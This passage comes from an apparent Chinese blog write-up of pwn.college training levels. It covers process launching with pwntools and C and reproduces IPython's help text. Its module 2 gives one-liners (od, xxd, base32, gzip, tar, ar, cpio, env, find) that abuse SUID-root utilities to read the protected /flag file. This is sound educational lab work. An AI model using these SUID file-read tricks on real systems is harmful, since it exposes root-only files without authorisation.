proc.stdin);</span><br><span class="hljs-comment">//    mv_fd(STDOUT_FILENO, proc.stdout);</span><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">2048</span>];<br>    <span class="hljs-keyword">char</span> buf_[<span class="hljs-number">2048</span>];<br>    read(proc.<span class="hljs-built_in">stdout</span>, buf, <span class="hljs-number">2048</span>);<br>    read(proc.<span class="hljs-built_in">stderr</span>, buf_,<span class="hljs-number">2048</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf_);<br>    waitpid(proc.pid);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p>真的是相当多, 见<a target="_blank" rel="noopener" href="https://pwn.college/modules/interaction">这里</a> </p>
<p>有个<a target="_blank" rel="noopener" href="https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf">pwntools-cheatsheet</a>比较特别, 应该能用上</p>
<h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><blockquote>
<p>怎么会有一百多个, 也太离谱了</p>
</blockquote>
<p>基本连接方式: ssh</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ssh-keygen -f pwnkey<br>cat pwnkey.pub #copy public key<br>ssh -i pwnkey hacker@dojo.pwn.college -v<br></code></pre></div></td></tr></table></figure>

<p>在/challenge/[对应文件]中, 直接执行即可</p>
<ul>
<li>从远程机器复制文件:</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">scp -i pwnkey hacker@dojo.pwn.college:/challenge/checker.py ./<br></code></pre></div></td></tr></table></figure>

<h3 id="level-几来着"><a href="#level-几来着" class="headerlink" title="level(几来着)"></a>level(几来着)</h3><p>要求以0个环境变量运行程序, 可以使用execve函数, env命令, exec命令三种方法</p>
<blockquote>
<p>其余的大概就是加环境变量, 加参数, 写在脚本里之类的简单题</p>
</blockquote>
<h3 id="level15新东西"><a href="#level15新东西" class="headerlink" title="level15新东西"></a>level15新东西</h3><p>新的一个东西: ipython, An enhenced interactive python, 增加了一些特别的功能, 还有个说明书放在本level的末尾.</p>
<p>ssh接上后, 进入ipython, 然后Ctrl+O就可以编辑多行脚本了, 使用的还是pwntools, 算是熟悉一点.</p>
<p>有两种方法: </p>
<ol>
<li><code>!exec /challenge/embryoio_level15</code> </li>
<li>用<code>pwn.process()</code> </li>
</ol>
<h3 id="Python-–-An-enhanced-Interactive-Python"><a href="#Python-–-An-enhanced-Interactive-Python" class="headerlink" title="Python – An enhanced Interactive Python"></a>Python – An enhanced Interactive Python</h3><p>IPython offers a fully compatible replacement for the standard Python<br>interpreter, with convenient shell features, special commands, command<br>history mechanism and output results caching.</p>
<p>At your system command line, type ‘ipython -h’ to see the command line<br>options available. This document only describes interactive features.</p>
<h5 id="GETTING-HELP"><a href="#GETTING-HELP" class="headerlink" title="GETTING HELP"></a>GETTING HELP</h5><p>Within IPython you have various way to access help:</p>
<p>  <strong>?     -&gt; Introduction and overview of IPython’s features (this screen).</strong><br>  object?   -&gt; Details about ‘object’.<br>  object??  -&gt; More detailed, verbose information about ‘object’.<br>  %quickref -&gt; Quick reference of all IPython specific syntax and magics.<br>  help      -&gt; Access Python’s own help system.</p>
<p>If you are in terminal IPython you can quit this screen by pressing <code>q</code>.</p>
<h5 id="MAIN-FEATURES"><a href="#MAIN-FEATURES" class="headerlink" title="MAIN FEATURES"></a>MAIN FEATURES</h5><ul>
<li><p>Access to the standard Python help with object docstrings and the Python<br>  manuals. Simply type ‘help’ (no quotes) to invoke it.</p>
</li>
<li><p>Magic commands: type %magic for information on the magic subsystem.</p>
</li>
<li><p>System command aliases, via the %alias command or the configuration file(s).</p>
</li>
<li><p>Dynamic object information:</p>
<p>  Typing ?word or word? prints detailed information about an object. Certain<br>  long strings (code, etc.) get snipped in the center for brevity.</p>
<p>  Typing ??word or word?? gives access to the full information without<br>  snipping long strings. Strings that are longer than the screen are printed<br>  through the less pager.</p>
<p>  The ?/?? system gives access to the full source code for any object (if<br>  available), shows function prototypes and other useful information.</p>
<p>  If you just want to see an object’s docstring, type ‘%pdoc object’ (without<br>  quotes, and without % if you have automagic on).</p>
</li>
<li><p><strong>Tab completion in the local namespace:</strong> </p>
<p>  At any time, hitting tab will complete any available python commands or<br>  variable names, and show you a list of the possible completions if there’s<br>  no unambiguous one. It will also complete filenames in the current directory.</p>
</li>
<li><p><strong>Search previous command history in multiple ways:</strong> </p>
<ul>
<li><p>Start typing, and then use arrow keys up/down or (Ctrl-p/Ctrl-n) to search<br>  through the history items that match what you’ve typed so far.</p>
</li>
<li><p>Hit Ctrl-r: opens a search prompt. Begin typing and the system searches<br>  your history for lines that match what you’ve typed so far, completing as<br>  much as it can.</p>
</li>
<li><p>%hist: search history by index.</p>
</li>
</ul>
</li>
<li><p><strong>Persistent command history across sessions.</strong></p>
</li>
<li><p>Logging of input with the ability to save and restore a working session.</p>
</li>
<li><p><strong>System shell with !. Typing !ls will run ‘ls’ in the current directory.</strong></p>
</li>
<li><p>The reload command does a ‘deep’ reload of a module: changes made to the<br>  module since you imported will actually be available without having to exit.</p>
</li>
<li><p>Verbose and colored exception traceback printouts. See the magic xmode and<br>  xcolor functions for details (just type %magic).</p>
</li>
<li><p>Input caching system:</p>
<p>  IPython offers numbered prompts (In/Out) with input and output caching. All<br>  input is saved and can be retrieved as variables (besides the usual arrow<br>  key recall).</p>
<p>  The following GLOBAL variables always exist (so don’t overwrite them!):<br>  _i: stores previous input.<br>  _ii: next previous.<br>  _iii: next-next previous.<br>  _ih : a list of all input _ih[n] is the input from line n.</p>
<p>  Additionally, global variables named _i&lt;n&gt; are dynamically created (&lt;n&gt;<br>  being the prompt counter), such that _i&lt;n&gt; == _ih[&lt;n&gt;]</p>
<p>  For example, what you typed at prompt 14 is available as _i14 and _ih[14].</p>
<p>  You can create macros which contain multiple input lines from this history,<br>  for later re-execution, with the %macro function.</p>
<p>  The history function %hist allows you to see any part of your input history<br>  by printing a range of the _i variables. Note that inputs which contain<br>  magic functions (%) appear in the history with a prepended comment. This is<br>  because they aren’t really valid Python code, so you can’t exec them.</p>
</li>
<li><p>Output caching system:</p>
<p>  For output that is returned from actions, a system similar to the input<br>  cache exists but using _ instead of _i. Only actions that produce a result<br>  (NOT assignments, for example) are cached. If you are familiar with<br>  Mathematica, IPython’s _ variables behave exactly like Mathematica’s %<br>   variables.</p>
<p>  The following GLOBAL variables always exist (so don’t overwrite them!):<br>  _ (one underscore): previous output.<br>  __ (two underscores): next previous.<br>  ___ (three underscores): next-next previous.</p>
<p>  Global variables named _<n> are dynamically created (<n> being the prompt<br>  counter), such that the result of output <n> is always available as _<n>.</p>
<p>  Finally, a global dictionary named _oh exists with entries for all lines<br>  which generated output.</p>
</li>
<li><p><strong><mark>Directory history:</mark></strong> </p>
<p>  <strong>Your history of visited directories is kept in the global list _dh, and the</strong><br>  <strong>magic %cd command can be used to go to any entry in that list.</strong> </p>
</li>
<li><p>Auto-parentheses and auto-quotes (adapted from Nathan Gray’s LazyPython)</p>
<ol>
<li><p>Auto-parentheses</p>
<p> Callable objects (i.e. functions, methods, etc) can be invoked like<br> this (notice the commas between the arguments)::</p>
<div class="hljs code-wrapper"><pre><code> In [1]: callable_ob arg1, arg2, arg3
</code></pre></div>
<p> and the input will be translated to this::</p>
<div class="hljs code-wrapper"><pre><code> callable_ob(arg1, arg2, arg3)
</code></pre></div>
<p> This feature is off by default (in rare cases it can produce<br> undesirable side-effects), but you can activate it at the command-line<br> by starting IPython with <code>--autocall 1</code>, set it permanently in your<br> configuration file, or turn on at runtime with <code>%autocall 1</code>.</p>
<p> You can force auto-parentheses by using ‘/‘ as the first character<br> of a line.  For example::</p>
<div class="hljs code-wrapper"><pre><code>  In [1]: /globals             # becomes &#39;globals()&#39;
</code></pre></div>
<p> Note that the ‘/‘ MUST be the first character on the line!  This<br> won’t work::</p>
<div class="hljs code-wrapper"><pre><code>  In [2]: print /globals    # syntax error
</code></pre></div>
<p> In most cases the automatic algorithm should work, so you should<br> rarely need to explicitly invoke /. One notable exception is if you<br> are trying to call a function with a list of tuples as arguments (the<br> parenthesis will confuse IPython)::</p>
<div class="hljs code-wrapper"><pre><code>  In [1]: zip (1,2,3),(4,5,6)  # won&#39;t work
</code></pre></div>
<p> but this will work::</p>
<div class="hljs code-wrapper"><pre><code> In [2]: /zip (1,2,3),(4,5,6)
 ------&gt; zip ((1,2,3),(4,5,6))
 Out[2]= [(1, 4), (2, 5), (3, 6)]
</code></pre></div>
<p>IPython tells you that it has altered your command line by<br>displaying the new command line preceded by –&gt;.  e.g.::</p>
<div class="hljs code-wrapper"><pre><code> In [18]: callable list
 -------&gt; callable (list)
</code></pre></div>
</li>
<li><p><mark>Auto-Quoting</mark> </p>
<p> You can force auto-quoting of a function’s arguments by using ‘,’ as<br> the first character of a line.  For example::</p>
<div class="hljs code-wrapper"><pre><code>  In [1]: ,my_function /home/me   # becomes my_function(&quot;/home/me&quot;)
</code></pre></div>
<p> If you use ‘;’ instead, the whole argument is quoted as a single<br> string (while ‘,’ splits on whitespace)::</p>
<div class="hljs code-wrapper"><pre><code>  In [2]: ,my_function a b c   # becomes my_function(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;)
  In [3]: ;my_function a b c   # becomes my_function(&quot;a b c&quot;)
</code></pre></div>
<p> Note that the ‘,’ MUST be the first character on the line!  This<br> won’t work::</p>
<div class="hljs code-wrapper"><pre><code>  In [4]: x = ,my_function /home/me    # syntax error
</code></pre></div>
</li>
</ol>
</li>
</ul>
<h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>从这题开始使用这个脚本, glob可根据 Unix 终端所用规则找出所有匹配特定模式的路径名</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob <br><span class="hljs-keyword">import</span> pwn <br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=pwn.PIPE, stdin=pwn.PIPE) <br>p.sendline(<span class="hljs-string">&quot;password&quot;</span>)    <span class="hljs-comment"># 要加这一个</span><br><span class="hljs-built_in">print</span>(p.read().decode())     <br></code></pre></div></td></tr></table></figure>

<h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><p>这题检查参数argv[1]. 要注意的是pwntools的process方法以前我都是直接使用process(“file/path”), 实际上是写到了argv[]的第0个位置, 如果<code>executable(Path to the binary to execute)</code>为None, pwntools则会使用argv[0], 这就是为什么往参数里写路径就可以执行的原因.</p>
<p>写成这样即可:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob <br><span class="hljs-keyword">import</span> pwn <br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>)+[<span class="hljs-string">&quot;gdncphvdkz&quot;</span>] , stdout=pwn.PIPE, stdin=pwn.PIPE) <br><br><span class="hljs-built_in">print</span>(p.read().decode())     <br></code></pre></div></td></tr></table></figure>

<h3 id="level18-21"><a href="#level18-21" class="headerlink" title="level18-21"></a>level18-21</h3><ul>
<li>18: 是环境变量, 在process的参数里加个<code>env=&#123;“balabala”=“blabla”&#125;</code>就可以了.</li>
<li>19: 是重定向stdin.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/rmxgbo&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(<span class="hljs-string">&quot;kmtxemmo\n&quot;</span>)<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=pwn.PIPE, stdin=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/rmxgbo&quot;</span>))<br><br><span class="hljs-built_in">print</span>(p.read().decode()) <br></code></pre></div></td></tr></table></figure>

<p>有一个问题: 上面的代码应该都是正确的, 但是只有再补充一句p.interactive()的时候最后两行flag才显示出来, 原因暂未知晓</p>
<ul>
<li>20: </li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/tkpich&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), stdin=pwn.PIPE)<br></code></pre></div></td></tr></table></figure>

<ul>
<li>21<br>  需要清空环境变量.<br>  注意到process这个函数中的env默认会继承python的环境变量就可以了, 必须手动清空</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob,pwn<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=pwn.PIPE, stdin=pwn.PIPE, env=&#123;&#125;)<br><br><span class="hljs-built_in">print</span>(p.read().decode())<br></code></pre></div></td></tr></table></figure>

<h3 id="level-22-28"><a href="#level-22-28" class="headerlink" title="level 22-28"></a>level 22-28</h3><ul>
<li>22: 这部分是使用命令行执行python来执行程序的,  比较简单.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob,pwn<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>))<br>p.interactive()<br></code></pre></div></td></tr></table></figure>

<ul>
<li>23-28: 重复一遍上面的工作, 比如0 environment, redirect stdin and out, 等等这些.</li>
</ul>
<h3 id="level-29-34"><a href="#level-29-34" class="headerlink" title="level 29-34"></a>level 29-34</h3><p>从这个开始就要编译C程序了, 29写下面这一段, 30输入一个密码.</p>
<p>值得注意的是, 如果直接调用execve, 那么会导致bash在执行.</p>
<p>如果没有waitpid, 那么子进程会被/docker/init(在我的ubuntu20.04上是/sbin/init)接管. </p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pwncollege</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[], <span class="hljs-keyword">char</span>** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//child process</span><br>        <span class="hljs-keyword">int</span> r=execve(<span class="hljs-string">&quot;/challenge/embryoio_level30&quot;</span>, argv, envp);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, r);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent process termianted.\n&quot;</span>);<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<ul>
<li><strong>31:</strong> 真的绝了, “a”原本写的是””, 父进程都不对, 过了一会儿重新编译又好了, 莫名其妙.</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pwncollege</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv, <span class="hljs-keyword">char</span>** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br><br>    <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//child process</span><br>        <span class="hljs-comment">//int r=execve(&quot;/challenge/embryoio_level31&quot;, argv, envp);</span><br>        <span class="hljs-keyword">int</span> r = execl(<span class="hljs-string">&quot;/challenge/embryoio_level31&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;lndhvgwxjx&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, r);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent process termianted.\n&quot;</span>);<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<ul>
<li>32: 直接修改envp好像会出问题, 原因未知. </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pwncollege</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv, <span class="hljs-keyword">char</span>** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">char</span>* argvs[<span class="hljs-number">3</span>];<br>    argvs[<span class="hljs-number">1</span>]=<span class="hljs-string">&quot;jxdefy=fbilpksemj&quot;</span>;    <span class="hljs-comment">//暂且先手动设置吧</span><br>    argvs[<span class="hljs-number">2</span>]=<span class="hljs-literal">NULL</span>;<br>    argvs[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;sldkfj&quot;</span>;<br>    <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//child process</span><br>        <span class="hljs-keyword">int</span> r = execle(<span class="hljs-string">&quot;/challenge/embryoio_level32&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;lndhvgwxjx&quot;</span>, <span class="hljs-literal">NULL</span>, argvs);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, r);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent process termianted.\n&quot;</span>);<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<ul>
<li>33: 这个就是c语言版本的重定位, 还附带父进程检查的那种. 考虑到execve系列函数会直接继承原来进程的大部分属性, 比如输入输出流, 所以直接对c程序重定向即可, 子进程直接继承.</li>
<li>34: 输出重定向.</li>
</ul>
<h3 id="level35"><a href="#level35" class="headerlink" title="level35-"></a>level35-</h3><ul>
<li><p>35: 用脚本运行, 可以不需要fork, 直接execve</p>
</li>
<li><p>36: 输出要是到cat的PIPE, 直接在命令行里输入: <code>./c | cat</code>即可</p>
</li>
<li><p>37: <code>./c | grep -E &quot;*&quot;</code> 结束</p>
</li>
<li><p>38: <code>./c | sed &quot;=&quot;</code> </p>
</li>
<li><p>39: <code>./c  | rev | rev</code> </p>
</li>
<li><p>40: 使用管道重定向stdin, 去看了下c中的PIPE操作.暂时没有发现怎么用在这道题目上.</p>
<p><del>直接来一手三重套娃, 这样子cat就不会马上终止了</del>. md不用也可以, 是我想复杂了.</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">./cat | cat | /challenge/embryoio_level40<br></code></pre></div></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//cat.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1024</span>];<br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-keyword">int</span> fd = argc == <span class="hljs-number">1</span> ? <span class="hljs-number">0</span> : open(argv[<span class="hljs-number">1</span>],<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">while</span> ((n = read(fd,buf,<span class="hljs-number">1024</span>)) &gt; <span class="hljs-number">0</span> &amp;&amp; write(<span class="hljs-number">1</span>,buf,n) &gt; <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<ul>
<li>41: 重定向stdout. 一样做法.</li>
<li>42: <code>bash x.sh | cat</code></li>
<li>43: grep</li>
<li>44: sed</li>
<li>45: rev</li>
<li>46: 我累了</li>
</ul>
<h3 id="level"><a href="#level" class="headerlink" title="level??"></a>level??</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br>pwn.context.log_level = <span class="hljs-string">&quot;DEBUG&quot;</span><br>p2 = pwn.process([<span class="hljs-string">&quot; /usr/bin/sed&quot;</span>, <span class="hljs-string">&quot;-e&quot;</span>, <span class="hljs-string">&quot;s/x/×/&quot;</span>])<br>p1 = pwn.process(glob.glob( <span class="hljs-string">&quot; /chailenge/enbryo* &quot;</span>)，stdout=p2.stdin)<br><span class="hljs-built_in">print</span>(p2.readall())<br></code></pre></div></td></tr></table></figure>

<h1 id="module-2"><a href="#module-2" class="headerlink" title="module 2"></a>module 2</h1><ul>
<li><p><a target="_blank" rel="noopener" href="https://wiki.archlinux.org/title/File_permissions_and_attributes">文件权限</a> </p>
</li>
<li></li>
</ul>
<h2 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h2><p>这部分的题目就是利用被设置suid的程序来以root的权限去读文件, 无论看起来是有多么的不可能.</p>
<p><code>cat head tail rev nano emacs vim od more less sort hd(hexdump) xxd base32(64) split gzip bzip2 zip&amp;unzip</code><br><code>tar ar cpio genisoimage env find make </code></p>
<ul>
<li>od: <code>od -t x8z -v -w 10 /flag</code> 硬是拼出来. </li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">0000000 6c6c6f632e6e7770 714f6f417b656765 685834544b387868 4e354550757a575a  &gt;pwn.college&#123;AoOqhx8KT4XhZWzuPE5N&lt;<br>0000040 2e337a6d50723671 4d734d54557a5851 0a7d577a49314d54                   &gt;q6rPmz3.QXzUTMsMTM1IzW&#125;.&lt;<br>0000070<br></code></pre></div></td></tr></table></figure>

<ul>
<li><p><code>hd /flag</code> (hexdump)</p>
</li>
<li><p><code>xxd -c60 /flag</code> 每行60个</p>
</li>
<li><p><code>base32 /flag | base32 -d</code> </p>
</li>
<li><p>split: split file into pieces. <code>split /flag</code> </p>
</li>
<li><p><code>gzip -c /flag | gzip -cd </code> </p>
</li>
<li><p>bzip2 有新的机制, 不过命令行参数和gzip非常接近</p>
</li>
<li><p><code>zip - /flag &gt; aa</code> and then<code>cat aa</code>    or    <code>unzip -p aa</code> </p>
</li>
<li><p><code>tar cf flag.tar flag</code> then <code>tar -xOf flag.tar</code> 研究了半天tar的参数, main operation那几个参数每次必须加上.f参数后紧跟文件名</p>
</li>
<li><p><code>ar c flag.ar flag</code> then <code>cat flag.ar</code> 发现经过root用户创建完archive之后直接就对其他用户可读了…更简单了</p>
</li>
<li><p>(23- )  cpio genisoimage: ???</p>
<ul>
<li><p><code>echo &quot;/flag&quot; | cpio -ov &gt; ~/flag.cpio</code> then <code>cat flagcpio</code> 不是直接将/flag放到cpio的stdin中……他只要<u>name-list</u>……</p>
</li>
<li></li>
</ul>
</li>
<li><p>env也行?太神奇了. <code>env cat /flag</code> </p>
</li>
<li><p><code>find /flag -maxdepth 0 -exec cat &#39;&#123;&#125;&#39; \;</code> </p>
</li>
<li></li>
</ul>
<h1 id="module-3"><a href="#module-3" class="headerlink" title="module 3"></a>module 3</h1><p>就是汇编代码的写</p>
<h2 id="3-简单乘法"><a href="#3-简单乘法" class="headerlink" title="3 简单乘法"></a>3 简单乘法</h2><p>要注意mul指令默认被乘数放在rax里面, 乘数由我们指定, 结果是拼接而成的: <strong>RDX:RAX</strong> </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>p = process(glob(<span class="hljs-string">&quot;/challenge/e*&quot;</span>))<br><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rax, rdi</span><br><span class="hljs-string">mov rcx, rdx</span><br><span class="hljs-string">mul rsi</span><br><span class="hljs-string">add rax, rcx</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>p.send(asm(shellcode))<br>p.interactive()<br></code></pre></div></td></tr></table></figure>

